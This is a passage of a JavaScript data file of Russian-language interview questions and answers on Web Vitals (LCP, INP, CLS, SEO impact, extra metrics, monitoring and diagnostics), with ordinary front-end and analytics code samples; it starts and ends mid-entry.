    difficulty: 'middle',
    tags: ['Web Vitals', 'измерения', 'RUM', 'Lighthouse', 'мониторинг', 'инструменты']
  },

  {
    id: 104,
    question: "Как оптимизировать LCP (Largest Contentful Paint)?",
    answer: "<p><strong>LCP оптимизация</strong> фокусируется на быстрой загрузке главного контента страницы.</p><p><strong>Основные причины медленного LCP:</strong></p><ul><li>Медленный server response time</li><li>Блокирующие ресурсы (CSS, JS)</li><li>Медленная загрузка ресурсов (изображения)</li><li>Client-side рендеринг</li></ul><p><strong>1. Оптимизация серверного ответа (TTFB):</strong></p><p><strong>Проблема:</strong></p><ul><li>Долгий TTFB (Time to First Byte)</li><li>Сервер медленно отвечает</li><li>Контент не может начать загружаться</li></ul><p><strong>Решения:</strong></p><ul><li>✅ CDN для статики и HTML</li><li>✅ Server-side caching (Redis, Memcached)</li><li>✅ Оптимизация database queries</li><li>✅ Edge computing (Cloudflare Workers)</li></ul><p><strong>2. Устранение render-blocking ресурсов:</strong></p><p><strong>CSS оптимизация:</strong></p><ul><li>// Критичный CSS inline</li><li>&lt;style&gt;/* критичные стили */&lt;/style&gt;</li><li>// Остальной CSS асинхронно</li><li>&lt;link rel=\"preload\" href=\"styles.css\" as=\"style\"</li><li>      onload=\"this.rel='stylesheet'\"&gt;</li></ul><p><strong>JavaScript оптимизация:</strong></p><ul><li>// Defer некритичных скриптов</li><li>&lt;script src=\"app.js\" defer&gt;&lt;/script&gt;</li><li>// Async для независимых скриптов</li><li>&lt;script src=\"analytics.js\" async&gt;&lt;/script&gt;</li></ul><p><strong>3. Оптимизация изображений:</strong></p><p><strong>Современные форматы:</strong></p><ul><li>WebP вместо JPEG/PNG (30% меньше)</li><li>AVIF ещё лучше (50% меньше)</li><li>// Picture с fallback</li><li>&lt;picture&gt;</li><li>  &lt;source srcset=\"hero.avif\" type=\"image/avif\"&gt;</li><li>  &lt;source srcset=\"hero.webp\" type=\"image/webp\"&gt;</li><li>  &lt;img src=\"hero.jpg\" alt=\"Hero\"&gt;</li><li>&lt;/picture&gt;</li></ul><p><strong>Responsive images:</strong></p><ul><li>&lt;img srcset=\"small.jpg 400w, medium.jpg 800w, large.jpg 1200w\"</li><li>     sizes=\"(max-width: 600px) 400px, 800px\"</li><li>     src=\"medium.jpg\"&gt;</li></ul><p><strong>Сжатие:</strong></p><ul><li>ImageOptim, Squoosh для ручной оптимизации</li><li>Sharp, imagemin для автоматической</li><li>CDN с автоматической оптимизацией (Cloudinary)</li></ul><p><strong>4. Resource Hints:</strong></p><p><strong>Preload критичных ресурсов:</strong></p><ul><li>&lt;link rel=\"preload\" href=\"hero.jpg\" as=\"image\"&gt;</li><li>&lt;link rel=\"preload\" href=\"font.woff2\" as=\"font\" crossorigin&gt;</li></ul><p><strong>Preconnect к критичным доменам:</strong></p><ul><li>&lt;link rel=\"preconnect\" href=\"https://cdn.example.com\"&gt;</li></ul><p><strong>5. Lazy loading некритичного:</strong></p><ul><li>// Native lazy loading</li><li>&lt;img src=\"below-fold.jpg\" loading=\"lazy\"&gt;</li><li>// НО! Не для LCP элемента</li><li>&lt;img src=\"hero.jpg\" loading=\"eager\"&gt; // или без атрибута</li></ul><p><strong>6. Server-Side Rendering (SSR):</strong></p><p><strong>Проблема SPA:</strong></p><ul><li>Client-side рендеринг медленный</li><li>JS загружается → выполняется → рендерит</li><li>LCP элемент появляется поздно</li></ul><p><strong>Решение:</strong></p><ul><li>Next.js, Nuxt.js — SSR из коробки</li><li>HTML с контентом сразу от сервера</li><li>Hydration для интерактивности</li></ul><p><strong>7. Priority Hints:</strong></p><ul><li>// Повысить приоритет LCP изображения</li><li>&lt;img src=\"hero.jpg\" fetchpriority=\"high\"&gt;</li><li>// Понизить для некритичного</li><li>&lt;img src=\"sidebar.jpg\" fetchpriority=\"low\"&gt;</li></ul><p><strong>8. Избегать слишком больших элементов:</strong></p><ul><li>Если LCP элемент — большое изображение 5MB</li><li>Сожмите или замените</li><li>Рассмотрите плейсхолдер + progressive loading</li></ul><p><strong>9. Fonts оптимизация:</strong></p><p><strong>Если LCP элемент содержит текст:</strong></p><ul><li>// font-display для избежания FOIT</li><li>@font-face {</li><li>  font-family: 'Custom';</li><li>  src: url('font.woff2');</li><li>  font-display: swap; // или optional</li><li>}</li><li>// Preload критичных шрифтов</li><li>&lt;link rel=\"preload\" href=\"font.woff2\" as=\"font\" crossorigin&gt;</li></ul><p><strong>Проверка оптимизации:</strong></p><ul><li>Lighthouse → LCP breakdown</li><li>Показывает что занимает время:</li><li>- TTFB</li><li>- Resource load delay</li><li>- Resource load time</li><li>- Element render delay</li></ul><p><strong>Целевые значения:</strong></p><ul><li>Mobile: ≤ 2.5s (на 3G)</li><li>Desktop: ≤ 1.5-2s</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'LCP', 'оптимизация', 'производительность', 'изображения']
  },

  {
    id: 105,
    question: "Как оптимизировать INP (Interaction to Next Paint) и улучшить отзывчивость?",
    answer: "<p><strong>INP оптимизация</strong> требует минимизации задержек между действиями пользователя и визуальным откликом.</p><p><strong>Что влияет на INP:</strong></p><ul><li>Long tasks блокируют main thread</li><li>Тяжёлые event handlers</li><li>Много работы при рендеринге</li><li>Third-party скрипты</li></ul><p><strong>1. Разбивка long tasks:</strong></p><p><strong>Проблема:</strong></p><ul><li>JavaScript задача > 50ms</li><li>Блокирует main thread</li><li>Браузер не может обработать взаимодействия</li></ul><p><strong>Решение — Task splitting:</strong></p><ul><li>// Плохо — всё за раз</li><li>function processItems(items) {</li><li>  items.forEach(item => heavyWork(item));</li><li>}</li><li>// Хорошо — chunks с yield</li><li>async function processItems(items) {</li><li>  for (let item of items) {</li><li>    heavyWork(item);</li><li>    await yieldToMain(); // отдаём контроль</li><li>  }</li><li>}</li><li>function yieldToMain() {</li><li>  return new Promise(resolve => setTimeout(resolve, 0));</li><li>}</li></ul><p><strong>2. Scheduler API (экспериментальный):</strong></p><ul><li>// Приоритизация задач</li><li>scheduler.postTask(() => {</li><li>  // критичная работа</li><li>}, {priority: 'user-blocking'});</li><li>scheduler.postTask(() => {</li><li>  // фоновая работа</li><li>}, {priority: 'background'});</li></ul><p><strong>3. Оптимизация event handlers:</strong></p><p><strong>Debounce для частых событий:</strong></p><ul><li>// Плохо — на каждый keystroke</li><li>input.addEventListener('input', handleSearch);</li><li>// Хорошо — debounced</li><li>input.addEventListener('input', debounce(handleSearch, 300));</li></ul><p><strong>Passive listeners где возможно:</strong></p><ul><li>// Для scroll, touch событий</li><li>element.addEventListener('touchstart', handler, {passive: true});</li><li>// Браузер знает что preventDefault не будет</li></ul><p><strong>4. Оптимизация рендеринга:</strong></p><p><strong>React оптимизации:</strong></p><ul><li>// Memo для тяжёлых вычислений</li><li>const expensiveValue = useMemo(() => {</li><li>  return computeExpensive(data);</li><li>}, [data]);</li><li>// Lazy loading компонентов</li><li>const Heavy = lazy(() => import('./Heavy'));</li><li>// Virtual scrolling для длинных списков</li><li>import {FixedSizeList} from 'react-window';</li></ul><p><strong>5. Web Workers для heavy computation:</strong></p><ul><li>// Главный поток</li><li>const worker = new Worker('worker.js');</li><li>worker.postMessage(data);</li><li>worker.onmessage = (e) => updateUI(e.data);</li><li>// worker.js</li><li>self.onmessage = (e) => {</li><li>  const result = heavyComputation(e.data);</li><li>  self.postMessage(result);</li><li>};</li></ul><p><strong>6. Code splitting:</strong></p><ul><li>// Динамические импорты</li><li>button.addEventListener('click', async () => {</li><li>  const module = await import('./heavy-feature.js');</li><li>  module.init();</li><li>});</li><li>// Webpack автоматически создаст отдельный chunk</li></ul><p><strong>7. Оптимизация third-party скриптов:</strong></p><p><strong>Стратегии:</strong></p><ul><li>// Defer загрузки</li><li>&lt;script src=\"analytics.js\" defer&gt;&lt;/script&gt;</li><li>// Или async</li><li>&lt;script src=\"widget.js\" async&gt;&lt;/script&gt;</li><li>// Lazy load после interaction</li><li>const loadChat = () => {</li><li>  const script = document.createElement('script');</li><li>  script.src = 'chat.js';</li><li>  document.body.append(script);</li><li>};</li><li>// Загружаем когда пользователь скроллит</li></ul><p><strong>8. Избегание forced reflow:</strong></p><ul><li>// Плохо — чтение и запись вперемешку</li><li>element.style.width = '100px';</li><li>const height = element.offsetHeight; // forced reflow</li><li>element.style.height = height + 'px';</li><li>// Хорошо — batch чтения и записи</li><li>const height = element.offsetHeight;</li><li>element.style.width = '100px';</li><li>element.style.height = height + 'px';</li></ul><p><strong>9. Content Visibility для off-screen:</strong></p><ul><li>// Отложить рендеринг невидимого</li><li>.below-fold {</li><li>  content-visibility: auto;</li><li>  contain-intrinsic-size: 0 500px;</li><li>}</li></ul><p><strong>10. Monitoring INP:</strong></p><ul><li>import {onINP} from 'web-vitals';</li><li>onINP(metric => {</li><li>  // Какой interaction был медленным</li><li>  console.log(metric.entries);</li><li>  // Отправка в аналитику</li><li>});</li></ul><p><strong>Debugging INP проблем:</strong></p><ul><li>Chrome DevTools → Performance</li><li>Записать interaction</li><li>Найти long tasks (> 50ms красные)</li><li>Посмотреть call stack</li><li>Оптимизировать тяжёлый код</li></ul><p><strong>Целевые значения:</strong></p><ul><li>✅ Хорошо: ≤ 200ms</li><li>⚠️ Улучшить: 200-500ms</li><li>❌ Плохо: > 500ms</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'INP', 'FID', 'отзывчивость', 'JavaScript', 'оптимизация']
  },

  {
    id: 106,
    question: "Как оптимизировать CLS (Cumulative Layout Shift) и избежать сдвигов макета?",
    answer: "<p><strong>CLS оптимизация</strong> направлена на предотвращение неожиданных сдвигов элементов страницы.</p><p><strong>Основные причины CLS:</strong></p><ul><li>Изображения без размеров</li><li>Ads, embeds, iframes без размеров</li><li>Динамически добавляемый контент</li><li>Web fonts вызывающие FOIT/FOUT</li><li>Действия ожидающие сетевого ответа</li></ul><p><strong>1. Указывайте размеры изображений:</strong></p><p><strong>Проблема:</strong></p><ul><li>&lt;img src=\"photo.jpg\"&gt; без width/height</li><li>Браузер не знает размер до загрузки</li><li>Резервирует 0px, потом растягивает</li><li>Контент ниже сдвигается</li></ul><p><strong>Решение:</strong></p><ul><li>// Явные размеры</li><li>&lt;img src=\"photo.jpg\" width=\"800\" height=\"600\"&gt;</li><li>// Или через CSS с aspect-ratio</li><li>img {</li><li>  width: 100%;</li><li>  height: auto;</li><li>  aspect-ratio: 16 / 9;</li><li>}</li></ul><p><strong>2. Резервирование места для динамического контента:</strong></p><p><strong>Для ads/embeds:</strong></p><ul><li>// Контейнер с фиксированной высотой</li><li>.ad-container {</li><li>  min-height: 250px;</li><li>  background: #f0f0f0;</li><li>}</li><li>// Или skeleton placeholder</li><li>&lt;div class=\"ad-skeleton\"&gt;</li><li>  &lt;!-- placeholder пока грузится --&gt;</li><li>&lt;/div&gt;</li></ul><p><strong>3. Избегайте контента выше существующего:</strong></p><p><strong>Плохо:</strong></p><ul><li>// Banner вставляется сверху после загрузки</li><li>document.body.insertBefore(banner, document.body.firstChild);</li><li>// Весь контент сдвигается вниз</li></ul><p><strong>Хорошо:</strong></p><ul><li>// Добавляем снизу или в reserved space</li><li>container.appendChild(newElement);</li><li>// Или с transform (не вызывает layout shift)</li><li>element.style.transform = 'translateY(-100px)';</li></ul><p><strong>4. Оптимизация веб-шрифтов:</strong></p><p><strong>Проблема FOUT (Flash of Unstyled Text):</strong></p><ul><li>Текст появляется системным шрифтом</li><li>Потом меняется на кастомный</li><li>Размер текста может измениться</li></ul><p><strong>Решение:</strong></p><ul><li>@font-face {</li><li>  font-family: 'Custom';</li><li>  src: url('font.woff2');</li><li>  font-display: optional; // лучший для CLS</li><li>  /* или swap, но может быть CLS */</li><li>}</li><li>// Preload критичных шрифтов</li><li>&lt;link rel=\"preload\" href=\"font.woff2\" as=\"font\" crossorigin&gt;</li><li>// Использовать похожий fallback шрифт</li><li>font-family: 'Custom', Arial, sans-serif;</li></ul><p><strong>5. Animations с transform/opacity:</strong></p><p><strong>Плохо — вызывает layout:</strong></p><ul><li>.element {</li><li>  animation: slide 300ms;</li><li>}</li><li>@keyframes slide {</li><li>  from { margin-left: 0; }</li><li>  to { margin-left: 100px; }</li><li>}</li></ul><p><strong>Хорошо — композитные свойства:</strong></p><ul><li>.element {</li><li>  animation: slide 300ms;</li><li>}</li><li>@keyframes slide {</li><li>  from { transform: translateX(0); }</li><li>  to { transform: translateX(100px); }</li><li>}</li><li>// transform и opacity не вызывают layout</li></ul><p><strong>6. User-initiated changes не считаются:</strong></p><ul><li>// Layout shift после взаимодействия OK</li><li>button.addEventListener('click', () => {</li><li>  panel.classList.toggle('open'); // это нормально</li><li>});</li><li>// Но в течение 500ms после клика</li></ul><p><strong>7. Infinite scroll оптимизация:</strong></p><ul><li>// Reserve space перед загрузкой</li><li>const placeholder = createPlaceholder(estimatedHeight);</li><li>container.appendChild(placeholder);</li><li>// Загрузили контент</li><li>fetch(nextPage).then(data => {</li><li>  placeholder.replaceWith(actualContent);</li><li>});</li></ul><p><strong>8. Monitoring CLS:</strong></p><ul><li>import {onCLS} from 'web-vitals';</li><li>onCLS(metric => {</li><li>  // Какие элементы вызвали shift</li><li>  metric.entries.forEach(entry => {</li><li>    console.log('Shifted:', entry.sources);</li><li>  });</li><li>});</li></ul><p><strong>9. Layout Shift Regions в DevTools:</strong></p><ul><li>Chrome DevTools → Performance</li><li>Enable 'Layout Shift Regions'</li><li>Записать страницу</li><li>Синие прямоугольники = layout shifts</li></ul><p><strong>10. Тестирование:</strong></p><ul><li>Lighthouse покажет элементы с CLS</li><li>Test на медленном 3G</li><li>Clear cache для реального UX</li></ul><p><strong>Целевые значения:</strong></p><ul><li>✅ Хорошо: ≤ 0.1</li><li>⚠️ Улучшить: 0.1 - 0.25</li><li>❌ Плохо: > 0.25</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'CLS', 'layout shift', 'стабильность', 'оптимизация']
  },

  {
    id: 107,
    question: "Как Web Vitals влияют на SEO и ранжирование в Google?",
    answer: "<p><strong>Web Vitals стали ranking signal</strong> в Google Search с июня 2021 года в рамках Page Experience update.</p><p><strong>Page Experience Signals:</strong></p><p><strong>Что входит:</strong></p><ul><li>✅ Core Web Vitals (LCP, INP, CLS)</li><li>✅ Mobile-friendliness</li><li>✅ HTTPS security</li><li>✅ No intrusive interstitials</li><li>✅ Safe browsing</li></ul><p><strong>Как влияет на ранжирование:</strong></p><p><strong>1. Прямое влияние:</strong></p><ul><li>Хорошие Web Vitals = небольшой ranking boost</li><li>Плохие Web Vitals = небольшой penalty</li><li>НЕ основной фактор, но tiebreaker</li></ul><p><strong>Степень влияния:</strong></p><ul><li>Контент и релевантность — главное</li><li>Page Experience — дополнительный сигнал</li><li>При равной релевантности выигрывает быстрый сайт</li></ul><p><strong>2. Косвенное влияние (важнее):</strong></p><p><strong>Поведенческие факторы:</strong></p><ul><li>Хороший UX → меньше bounce rate</li><li>Быстрая загрузка → больше engagement</li><li>Стабильность → больше кликов</li><li>Отзывчивость → дольше на сайте</li></ul><p><strong>Статистика:</strong></p><ul><li>53% пользователей покидают сайт если загрузка > 3 сек</li><li>Улучшение LCP на 1 сек = +8% конверсии (Amazon)</li><li>100ms улучшения → +1% продаж (Walmart)</li></ul><p><strong>3. Mobile-first indexing:</strong></p><ul><li>Google индексирует mobile версию первой</li><li>Web Vitals на mobile критичнее</li><li>Mobile UX влияет на desktop ранжирование тоже</li></ul><p><strong>Как Google измеряет:</strong></p><p><strong>Chrome User Experience Report (CrUX):</strong></p><ul><li>Real user data от Chrome пользователей</li><li>28-дневное скользящее окно</li><li>75-й перцентиль для оценки</li><li>Origin-level данные (весь домен)</li></ul><p><strong>Пороги для ranking:</strong></p><ul><li>✅ \"Good\" — полный ranking benefit</li><li>⚠️ \"Needs Improvement\" — частичный benefit</li><li>❌ \"Poor\" — без benefit или penalty</li></ul><p><strong>Field Data vs Lab Data:</strong></p><ul><li>Google использует ТОЛЬКО field data (CrUX)</li><li>Lab data (Lighthouse) — для разработки</li><li>Но не влияет на ranking напрямую</li></ul><p><strong>4. Мониторинг в Search Console:</strong></p><p><strong>Core Web Vitals Report:</strong></p><ul><li>Google Search Console → Core Web Vitals</li><li>Показывает проблемные URLs</li><li>Группировка по типам страниц</li><li>Тренды за время</li></ul><p><strong>Статусы:</strong></p><ul><li>Poor URLs — требуют исправления</li><li>Need Improvement — желательно улучшить</li><li>Good URLs — всё ОК</li></ul><p><strong>5. Best Practices для SEO:</strong></p><p><strong>Приоритизация:</strong></p><ul><li>1. Самые важные страницы (home, category, product)</li><li>2. Страницы с высоким трафиком</li><li>3. Страницы с высоким bounce rate</li><li>4. Остальные страницы</li></ul><p><strong>Continuous monitoring:</strong></p><ul><li>Настроить автоматический мониторинг</li><li>web-vitals библиотека → Analytics</li><li>Alerts при ухудшении метрик</li></ul><p><strong>6. Mobile performance особенно важен:</strong></p><ul><li>Тестируйте на реальных устройствах</li><li>Throttling в DevTools (Fast 3G)</li><li>WebPageTest с mobile profiles</li></ul><p><strong>7. Региональные различия:</strong></p><ul><li>CrUX данные по регионам</li><li>Users в Индии vs США — разная скорость</li><li>CDN для глобального охвата</li></ul><p><strong>Мифы о Web Vitals и SEO:</strong></p><ul><li>❌ \"Хорошие Web Vitals гарантируют топ-1\" — нет</li><li>❌ \"Плохие Web Vitals = drop из индекса\" — нет</li><li>❌ \"Lab scores влияют на ranking\" — нет</li><li>✅ Это один из многих факторов</li><li>✅ Важнее для UX чем для SEO напрямую</li></ul><p><strong>ROI оптимизации:</strong></p><ul><li>SEO benefit — небольшой</li><li>UX/конверсия benefit — огромный</li><li>Стоит делать в первую очередь для пользователей</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'SEO', 'ranking', 'Google', 'CrUX', 'Page Experience']
  },

  {
    id: 108,
    question: "Какие дополнительные метрики Web Vitals существуют помимо Core?",
    answer: "<p><strong>Other Web Vitals</strong> — дополнительные метрики, помогающие глубже понять производительность.</p><p><strong>Loading метрики:</strong></p><p><strong>1. FCP (First Contentful Paint):</strong></p><p><strong>Что измеряет:</strong></p><ul><li>Когда появляется первый контент</li><li>Первый текст, изображение, canvas</li><li>Показатель воспринимаемой скорости</li></ul><p><strong>Цели:</strong></p><ul><li>✅ Хорошо: ≤ 1.8s</li><li>⚠️ Улучшить: 1.8 - 3s</li><li>❌ Плохо: > 3s</li></ul><p><strong>2. TTFB (Time to First Byte):</strong></p><p><strong>Что измеряет:</strong></p><ul><li>Время до первого байта от сервера</li><li>Включает: DNS, TCP, SSL, server processing</li><li>Foundation для всех остальных метрик</li></ul><p><strong>Цели:</strong></p><ul><li>✅ Хорошо: ≤ 800ms</li><li>⚠️ Улучшить: 800ms - 1.8s</li><li>❌ Плохо: > 1.8s</li></ul><p><strong>3. FMP (First Meaningful Paint) — deprecated:</strong></p><ul><li>Заменён на LCP</li><li>Был: когда primary content visible</li><li>Проблема: сложно определить \"meaningful\"</li></ul><p><strong>Interactivity метрики:</strong></p><p><strong>1. TBT (Total Blocking Time):</strong></p><p><strong>Что измеряет:</strong></p><ul><li>Сумма времени main thread блокировок</li><li>Между FCP и TTI</li><li>Показатель в lab условиях (Lighthouse)</li></ul><p><strong>Как рассчитывается:</strong></p><ul><li>Long task = задача > 50ms</li><li>Blocking time = duration - 50ms</li><li>TBT = сумма всех blocking times</li></ul><p><strong>Цели:</strong></p><ul><li>✅ Хорошо: ≤ 200ms</li><li>⚠️ Улучшить: 200 - 600ms</li><li>❌ Плохо: > 600ms</li></ul><p><strong>2. TTI (Time to Interactive):</strong></p><p><strong>Что измеряет:</strong></p><ul><li>Когда страница fully interactive</li><li>Main thread свободен минимум 5 секунд</li><li>Нет long tasks</li></ul><p><strong>Conditions для TTI:</strong></p><ul><li>FCP произошёл</li><li>Event handlers зарегистрированы</li><li>Страница отвечает на взаимодействия < 50ms</li></ul><p><strong>Visual Stability метрики:</strong></p><p><strong>1. Layout Shift Score:</strong></p><ul><li>Отдельные сдвиги</li><li>CLS — кумулятивная сумма</li><li>Можно отслеживать каждый shift отдельно</li></ul><p><strong>User-Centric метрики:</strong></p><p><strong>1. Speed Index:</strong></p><p><strong>Что измеряет:</strong></p><ul><li>Как быстро визуально заполняется страница</li><li>Average time для visible parts появиться</li><li>Чем ниже — тем лучше</li></ul><p><strong>Как работает:</strong></p><ul><li>Анализ видео загрузки</li><li>Прогресс визуальной полноты</li><li>Интегральная метрика</li></ul><p><strong>Цели:</strong></p><ul><li>✅ Хорошо: ≤ 3.4s</li><li>⚠️ Улучшить: 3.4 - 5.8s</li><li>❌ Плохо: > 5.8s</li></ul><p><strong>Network метрики:</strong></p><p><strong>1. Resource Timing:</strong></p><ul><li>Подробная информация о каждом ресурсе</li><li>DNS lookup time</li><li>TCP connection time</li><li>Download time</li></ul><p><strong>2. Navigation Timing:</strong></p><ul><li>Полный lifecycle загрузки страницы</li><li>От ввода URL до полной загрузки</li></ul><p><strong>Custom метрики:</strong></p><p><strong>User Timing API:</strong></p><ul><li>// Создание custom marks</li><li>performance.mark('feature-start');</li><li>// ... код feature</li><li>performance.mark('feature-end');</li><li>performance.measure('feature-duration', </li><li>  'feature-start', 'feature-end');</li><li>// Получение метрики</li><li>const measure = performance.getEntriesByName('feature-duration')[0];</li></ul><p><strong>Практическое применение:</strong></p><p><strong>Диагностика проблем:</strong></p><ul><li>Высокий TTFB → серверные проблемы</li><li>Высокий FCP но низкий LCP → проблема с главным контентом</li><li>Высокий TBT → JavaScript оптимизация нужна</li><li>Плохой Speed Index → rendering оптимизация</li></ul><p><strong>Performance Budget:</strong></p><ul><li>Установить лимиты для каждой метрики</li><li>TBT < 300ms</li><li>FCP < 1.5s</li><li>TTFB < 600ms</li><li>CI/CD проверки при deploy</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'метрики', 'FCP', 'TTFB', 'TBT', 'производительность']
  },

  {
    id: 109,
    question: "Как настроить автоматический мониторинг Web Vitals в продакшене?",
    answer: "<p><strong>Continuous monitoring Web Vitals</strong> критичен для отслеживания реального пользовательского опыта.</p><p><strong>1. Web Vitals JavaScript библиотека:</strong></p><p><strong>Установка и базовая настройка:</strong></p><ul><li>npm install web-vitals</li><li>// app.js</li><li>import {onCLS, onFID, onLCP, onINP, onFCP, onTTFB} from 'web-vitals';</li><li>function sendToAnalytics(metric) {</li><li>  const body = JSON.stringify({</li><li>    name: metric.name,</li><li>    value: metric.value,</li><li>    rating: metric.rating,</li><li>    delta: metric.delta,</li><li>    id: metric.id,</li><li>    navigationType: metric.navigationType,</li><li>  });</li><li>  // Отправка (beacon API для reliability)</li><li>  navigator.sendBeacon('/analytics', body);</li><li>}</li><li>// Регистрация всех метрик</li><li>onCLS(sendToAnalytics);</li><li>onFID(sendToAnalytics);</li><li>onLCP(sendToAnalytics);</li><li>onINP(sendToAnalytics);</li></ul><p><strong>2. Интеграция с Google Analytics 4:</strong></p><p><strong>Автоматическая отправка:</strong></p><ul><li>import {onCLS, onFID, onLCP} from 'web-vitals';</li><li>function sendToGA(metric) {</li><li>  gtag('event', metric.name, {</li><li>    value: Math.round(metric.value),</li><li>    event_category: 'Web Vitals',</li><li>    event_label: metric.id,</li><li>    non_interaction: true,</li><li>  });</li><li>}</li><li>onCLS(sendToGA);</li><li>onFID(sendToGA);</li><li>onLCP(sendToGA);</li></ul><p><strong>Custom dimensions:</strong></p><ul><li>// Добавление контекста</li><li>function sendToGA(metric) {</li><li>  gtag('event', metric.name, {</li><li>    value: Math.round(metric.value),</li><li>    page_path: window.location.pathname,</li><li>    device_type: isMobile() ? 'mobile' : 'desktop',</li><li>    connection: navigator.connection?.effectiveType,</li><li>  });</li><li>}</li></ul><p><strong>3. Сервисы Real User Monitoring:</strong></p><p><strong>SpeedCurve:</strong></p><ul><li>// Установка</li><li>&lt;script src=\"https://cdn.speedcurve.com/js/lux.js\"&gt;&lt;/script&gt;</li><li>// Автоматически собирает Web Vitals</li><li>// + подробная аналитика</li></ul><p><strong>Datadog RUM:</strong></p><ul><li>import {datadogRum} from '@datadog/browser-rum';</li><li>datadogRum.init({</li><li>  applicationId: 'APP_ID',</li><li>  clientToken: 'TOKEN',</li><li>  site: 'datadoghq.com',</li><li>  service: 'my-app',</li><li>  trackInteractions: true,</li><li>  trackResources: true,</li><li>  trackLongTasks: true,</li><li>});</li><li>// Web Vitals автоматически</li></ul><p><strong>New Relic Browser:</strong></p><ul><li>&lt;script src=\"https://js-agent.newrelic.com/...\"&gt;&lt;/script&gt;</li><li>// Core Web Vitals из коробки</li><li>// Session traces для debugging</li></ul><p><strong>4. Backend для агрегации:</strong></p><p><strong>Простой endpoint:</strong></p><ul><li>// server.js</li><li>app.post('/analytics', async (req, res) => {</li><li>  const {name, value, id, navigationType} = req.body;</li><li>  // Сохранение в БД</li><li>  await db.metrics.insert({</li><li>    metric: name,</li><li>    value: value,</li><li>    metricId: id,</li><li>    userAgent: req.headers['user-agent'],</li><li>    timestamp: Date.now(),</li><li>    url: req.headers.referer,</li><li>  });</li><li>  res.sendStatus(200);</li><li>});</li></ul><p><strong>5. Сегментация данных:</strong></p><p><strong>По типам устройств:</strong></p><ul><li>function getDeviceType() {</li><li>  const ua = navigator.userAgent;</li><li>  if (/mobile/i.test(ua)) return 'mobile';</li><li>  if (/tablet/i.test(ua)) return 'tablet';</li><li>  return 'desktop';</li><li>}</li></ul><p><strong>По типам подключения:</strong></p><ul><li>const connection = navigator.connection;</li><li>const effectiveType = connection?.effectiveType; // '4g', '3g'</li><li>const downlink = connection?.downlink; // Mbps</li></ul><p><strong>По географии:</strong></p><ul><li>// Через IP geolocation на сервере</li><li>const country = geoip.lookup(req.ip)?.country;</li></ul><p><strong>6. Dashboards и визуализация:</strong></p><p><strong>Grafana dashboard:</strong></p><ul><li>Подключение к БД с метриками</li><li>Графики трендов LCP, INP, CLS</li><li>Перцентили (p50, p75, p95)</li><li>Breakdown по страницам</li></ul><p><strong>Custom dashboard:</strong></p><ul><li>// Запрос агрегированных данных</li><li>SELECT </li><li>  metric,</li><li>  PERCENTILE_CONT(0.75) WITHIN GROUP (ORDER BY value) as p75</li><li>FROM metrics</li><li>WHERE timestamp > NOW() - INTERVAL '7 days'</li><li>GROUP BY metric;</li></ul><p><strong>7. Алерты при деградации:</strong></p><ul><li>// Если p75 LCP > 2.5s за последний час</li><li>if (p75LCP > 2500) {</li><li>  sendAlert({</li><li>    severity: 'warning',</li><li>    message: 'LCP degraded',</li><li>    value: p75LCP,</li><li>  });</li><li>}</li></ul><p><strong>8. A/B testing влияния изменений:</strong></p><ul><li>// Добавление эксперимента ID</li><li>function sendToAnalytics(metric) {</li><li>  const experimentId = getActiveExperiment();</li><li>  // Отправка с experimentId</li><li>  // Сравнение метрик между вариантами</li><li>}</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Мониторинг 24/7 в production</li><li>✅ Sampling для высоконагруженных сайтов</li><li>✅ Сегментация по device, connection, geography</li><li>✅ Алерты на деградацию метрик</li><li>✅ Integration с CI/CD</li><li>✅ Regular review дашбордов</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'мониторинг', 'RUM', 'аналитика', 'автоматизация', 'production']
  },

  {
    id: 110,
    question: "Как Web Vitals помогают диагностировать проблемы производительности?",
    answer: "<p><strong>Web Vitals как диагностический инструмент</strong> позволяет систематически выявлять узкие места.</p><p><strong>Методология диагностики:</strong></p><p><strong>1. Определение проблемной метрики:</strong></p><p><strong>LCP плохой:</strong></p><ul><li>Проблема: медленная загрузка контента</li><li>Где искать: images, fonts, server response</li></ul><p><strong>INP плохой:</strong></p><ul><li>Проблема: main thread блокировки</li><li>Где искать: JavaScript execution, long tasks</li></ul><p><strong>CLS плохой:</strong></p><ul><li>Проблема: нестабильный layout</li><li>Где искать: images без размеров, динамический контент</li></ul><p><strong>2. LCP диагностика breakdown:</strong></p><p><strong>Lighthouse LCP phases:</strong></p><ul><li><strong>TTFB</strong> — Time to First Byte</li><li><strong>Resource load delay</strong> — задержка начала загрузки</li><li><strong>Resource load time</strong> — время загрузки</li><li><strong>Element render delay</strong> — задержка рендеринга</li></ul><p><strong>Какой phase проблемный:</strong></p><ul><li>TTFB высокий → серверные проблемы</li><li>Load delay → render-blocking ресурсы</li><li>Load time → большой размер ресурса</li><li>Render delay → JavaScript блокирует</li></ul><p><strong>Инструменты:</strong></p><ul><li>Chrome DevTools → Performance</li><li>Lighthouse → LCP breakdown</li><li>WebPageTest → waterfall</li></ul><p><strong>3. INP диагностика:</strong></p><p><strong>Identifying long tasks:</strong></p><ul><li>// Обнаружение через PerformanceObserver</li><li>const observer = new PerformanceObserver(list => {</li><li>  list.getEntries().forEach(entry => {</li><li>    if (entry.duration > 50) {</li><li>      console.log('Long task:', {</li><li>        duration: entry.duration,</li><li>        startTime: entry.startTime,</li><li>      });</li><li>    }</li><li>  });</li><li>});</li><li>observer.observe({entryTypes: ['longtask']});</li></ul><p><strong>Chrome DevTools анализ:</strong></p><ul><li>Performance → Record interaction</li><li>Найти медленный event handler</li><li>Bottom-Up view → какая функция тяжёлая</li><li>Call Tree → откуда вызывается</li></ul><p><strong>4. CLS диагностика:</strong></p><p><strong>Layout Instability API:</strong></p><ul><li>const observer = new PerformanceObserver(list => {</li><li>  list.getEntries().forEach(entry => {</li><li>    console.log('Layout shift:', {</li><li>      value: entry.value,</li><li>      sources: entry.sources.map(s => ({</li><li>        node: s.node,</li><li>        previousRect: s.previousRect,</li><li>        currentRect: s.currentRect,</li><li>      })),</li><li>    });</li><li>  });</li><li>});</li><li>observer.observe({entryTypes: ['layout-shift']});</li></ul><p><strong>Chrome DevTools:</strong></p><ul><li>Performance → Enable 'Layout Shift Regions'</li><li>Синие прямоугольники = сдвиги</li><li>Инспекция какой элемент</li></ul><p><strong>5. Сегментация для 